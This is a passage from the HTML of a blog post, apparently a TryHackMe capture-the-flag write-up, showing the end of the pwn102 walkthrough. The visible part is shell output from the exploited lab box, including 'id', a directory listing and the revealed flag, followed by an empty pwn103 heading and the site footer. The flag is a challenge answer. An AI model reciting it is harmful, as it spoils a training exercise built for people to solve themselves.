+</span></span><span style="display:flex;"><span>Yes, I need c0ff33 to c0d3
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>pwn102<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>pwn102<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>pwn102<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> pwn102 pwn102 <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">12</span> root   root   <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> pwn102 pwn102    <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> pwn102 pwn102  <span style="color:#ae81ff">220</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> pwn102 pwn102 <span style="color:#ae81ff">3771</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">3</span> pwn102 pwn102 <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> pwn102 pwn102  <span style="color:#ae81ff">807</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .profile
+</span></span><span style="display:flex;"><span>-rwxrwxrwx  <span style="color:#ae81ff">1</span> pwn102 pwn102   <span style="color:#ae81ff">34</span> Jan <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span> flag.txt
+</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> pwn102 pwn102 <span style="color:#ae81ff">8720</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> pwn102
+</span></span><span style="display:flex;"><span>-rwxrwxrwx  <span style="color:#ae81ff">1</span> pwn102 pwn102  <span style="color:#ae81ff">964</span> Feb  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> pwn102.c
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>y3s_1_n33D_C0ff33_to_C0d3_&lt;3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="pwn103">pwn103</h1>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://abund4nt.github.io/" >
+    &copy;  abund4nt 2024 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    
+    <a href="https://github.com/abund4nt" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
